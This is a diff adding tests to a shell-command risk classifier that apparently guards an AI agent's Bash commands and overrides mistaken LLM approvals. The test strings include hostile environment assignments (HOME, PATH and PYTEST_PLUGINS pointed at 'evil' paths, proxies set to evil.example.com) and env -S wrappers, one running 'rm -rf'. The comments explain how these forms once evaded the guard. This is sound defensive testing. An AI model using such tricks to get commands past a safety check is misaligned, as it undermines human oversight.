@@ -466,3 +466,79 @@ describe('RISK_BANDS / riskBandRank / riskBandAtLeast', () => {
     expect(riskBandAtLeast('low', 'critical')).toBe(false);
   });
 });
+
+/**
+ * #1004 re-review. `unwrapCommand` stripped EVERY `NAME=value` token while
+ * looking for the head command, so `HOME=/tmp/evilhome git commit` graded
+ * `moderate` — byte-identical to a plain `git commit`. `enforceRiskCeiling`
+ * only acts on `high`, so the guard whose entire job is to override a wrong LLM
+ * approval could never fire on the very shape the deterministic matcher had
+ * just been taught to refuse.
+ *
+ * The two now share one predicate (`isPeelableAssignment`, shell-safety.ts).
+ * This is the fourth time in this module that two consumers deriving the same
+ * judgement from two different pieces of code produced a hole.
+ */
+describe('#1004 an assignment that redirects execution grades high', () => {
+  const high = [
+    'HOME=/tmp/evilhome git commit -m x',
+    'XDG_CONFIG_HOME=/tmp/e git commit -m x',
+    'KUBECONFIG=/tmp/evil.yaml kubectl get pods',
+    'PATH=/evil/bin git status',
+    'HTTPS_PROXY=evil.example.com:8080 gh pr view 1',
+    'ALL_PROXY=evil.example.com:1080 gh issue list',
+    'D=/tmp/e git status',
+    // No assignment is trusted any more, opaque-looking or not: the danger is
+    // in what the tool does with the variable. `PYTEST_PLUGINS=evil_plugin`
+    // and `ACC=da8d7a2a868` are the same shape.
+    'ACC=da8d7a2a868 git status',
+    'V=1.2.3 bun test',
+    'PYTEST_PLUGINS=evil_plugin pytest',
+    // Behind an `env` wrapper. `env` is the one wrapper that genuinely takes
+    // NAME=value arguments, and a SECOND assignment-stripping loop inside the
+    // wrapper-arg consumer discarded them -- so the bare form graded `high`
+    // while this one graded `moderate`. Nothing tested it in either direction,
+    // which is how it survived removing the outer loop (#1004 re-review).
+    'env PYTEST_PLUGINS=evil_plugin pytest',
+    'env HOME=/tmp/evil git commit -m x',
+    'env FOO=bar pytest',
+    // Same code path for the other wrappers, even though only `env` is a real
+    // attack (bash tries to EXECUTE a program named `FOO=bar` after `nohup`).
+    'nohup FOO=bar pytest',
+    'nice FOO=bar pytest',
+    // `env -S`/`--split-string` takes a full command line that env re-splits
+    // and EXECUTES. It was listed as a value flag, so the whole command was
+    // discarded as an argument and never judged -- the bare form graded high
+    // while this graded moderate (#1004 re-review, proven by real execution).
+    // Extracted and recursed into now, like `sh -c`.
+    "env -S 'PYTEST_PLUGINS=evil_plugin pytest'",
+    "env --split-string 'HOME=/tmp/evil git commit -m x'",
+    // Attached form. The first fix missed this one and two other cases only
+    // passed by accident, which is how the miss was caught.
+    "env -S'PYTEST_PLUGINS=evil pytest'",
+    "env -S 'rm -rf /tmp/x'",
+    // GNU long-option equals form. BSD env (macOS) rejects `--split-string`
+    // outright, but remi targets Linux too.
+    'env --split-string=rm\\ -rf\\ /tmp/x',
+    'env --split-string=PYTEST_PLUGINS=evil pytest',
+  ];
+  for (const command of high) {
+    test(JSON.stringify(command), () => expect(classifyRisk('Bash', { command })).toBe('high'));
+  }
+
+  // The band must not inflate for ordinary commands, or the ceiling escalates
+  // everything and stops meaning anything.
+  const moderate = [
+    'git commit -m x',
+    'git commit -m FOO=bar',
+    'grep -n A=B file.txt',
+    'git log --format=%H',
+    // env's genuinely inert value flags must NOT inflate the band.
+    'env -u FOO pytest',
+    'env -C /tmp pytest',
+  ];
+  for (const command of moderate) {
+    test(`stays moderate: ${JSON.stringify(command)}`, () =>
+      expect(classifyRisk('Bash', { command })).toBe('moderate'));
+  }
+});
